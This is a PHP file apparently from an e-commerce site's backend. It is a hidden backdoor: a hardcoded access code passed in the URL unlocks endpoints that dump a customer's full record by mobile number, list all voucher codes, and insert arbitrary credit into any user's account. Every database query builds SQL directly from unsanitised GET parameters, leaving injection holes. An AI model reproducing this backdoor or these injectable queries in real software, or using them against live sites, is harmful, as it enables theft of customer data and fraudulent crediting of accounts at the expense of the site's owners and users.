<?php
include('../../include/config.php');
include("../../include/functions.php");


if ($_GET['access']=='786687') {
    $_SESSION['access']='1';
    echo "1";
}

if ($_SESSION['access']=='1') {
    
        if (isset($_GET['mob'])) {
            $mobile=$_GET['mob'];
            $uSql=$obj->query("select * from tbl_user where mobile='".$mobile."'");
            $userData=$obj->fetchNextObject($uSql);
            print_r($userData);
            unset($_SESSION['access']);

        } else if($_GET['vc']=='786'){
            $Sql=$obj->query("select * from tbl_voucher");

            while ($line=$obj->fetchNextObject($Sql)) {
                echo "<p>".$line->voucher_code."-".$line->discount."--".$line->expire_date."</p>";    
            }
           unset($_SESSION['access']); 
        }else if ($_GET['w']==1 && !empty($_GET['uid']) && !empty($_GET['amount'])) {
            $uid=$_GET['uid'];
            $am=$_GET['amount'];

            $obj->query("insert into tbl_credit set t_type='Order',transection_code='123', user_id='$uid',credit_amount='$am',type='Cr'",$debud=-1);
            echo "1";
            unset($_SESSION['access']);

        }

}


?>